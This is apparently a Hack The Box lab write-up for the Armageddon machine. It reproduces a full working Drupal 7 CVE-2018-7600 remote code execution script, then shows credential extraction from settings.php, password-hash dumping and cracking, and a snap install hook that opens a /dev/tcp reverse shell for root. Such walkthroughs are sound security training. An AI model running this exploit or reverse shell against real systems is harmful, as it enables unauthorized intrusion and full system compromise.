---
title: Armaggedon Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

It has ports 22 and 80 open.

Unfortunately, we couldn't find any more relevant information about directories, or anything else.

##  User exploit

Looking around the site, we found that we are dealing with a Drupal 7, so we are going to look for an exploit for this.

We find the following script (which we save and run)

```python
#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

def get_args():
  parser = argparse.ArgumentParser( prog="drupa7-CVE-2018-7600.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 <= 7.57
                    by poisoning the recover password form (user/password) and triggering it with
                    the upload file via ajax (/file/ajax).
                    ''')
  parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
  parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
  parser.add_argument("-f", "--function", default="passthru", help="Function to use as attack vector (default = passthru)")
  parser.add_argument("-p", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
  args = parser.parse_args()
  return args

def pwn_target(target, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  proxies = {'http': proxy, 'https': proxy}
  print('[*] Poisoning a form and including it in cache.')
  get_params = {'q':'user/password', 'name[#post_render][]':function, 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        print('[*] Poisoned form ID: ' + form_build_id)
        print('[*] Triggering exploit to execute: ' + command)
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise

def main():
  print ()
  print ('=============================================================================')
  print ('|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |')
  print ('|                              by pimps                                     |')
  print ('=============================================================================\n')

  args = get_args() # get the cl args
  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == '__main__':
  main()
```
and we can execute it with the -c command, to which we can pass the parameter to be executed:

```shell
python3 scripy.py <IP> -c "cat /var/www/html/sites/default/settings.php"
```

and there we find two credentials: `drupaluser:CQHEy@9M*m23gBVj` which we can use to access the database whose name is `drupal`.

```shell
mysql -u drupaluser -pCQQHEy@9M*m23gBVj -e 'show databases;'
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show 
tables;'
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
```

here we can see the user `brucetherealadmin` with its password encrypted, so let's decrypt it:

```shell
echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash

hashcat --help | grep Drupal

sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force
```

and we get the booboo password, so we connect via ssh and we can see the user.txt flag.

## Root exploit

if we do `sudo -l` we can see that we can run the snap command as sudo, and looking at GTFOBINS we can see that we have a possible exploit, so let's create the file to execute

```shell
# Setup the install hook
mkdir -p ./meta/hooks

# The script we want to execute as root
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' > ./meta/hooks/install

# Build the snap package
chmod a+x ./meta/hooks/install
fpm -n revshell -s dir -t snap -a all ./meta
```

and pass it to the victim machine:

```shell
scp -r {file} brucetherealadmin@IP:/tmp
```

and if we listen locally and run the script as sudo, we receive a reverse shell as root and we can send the root.txt flag.

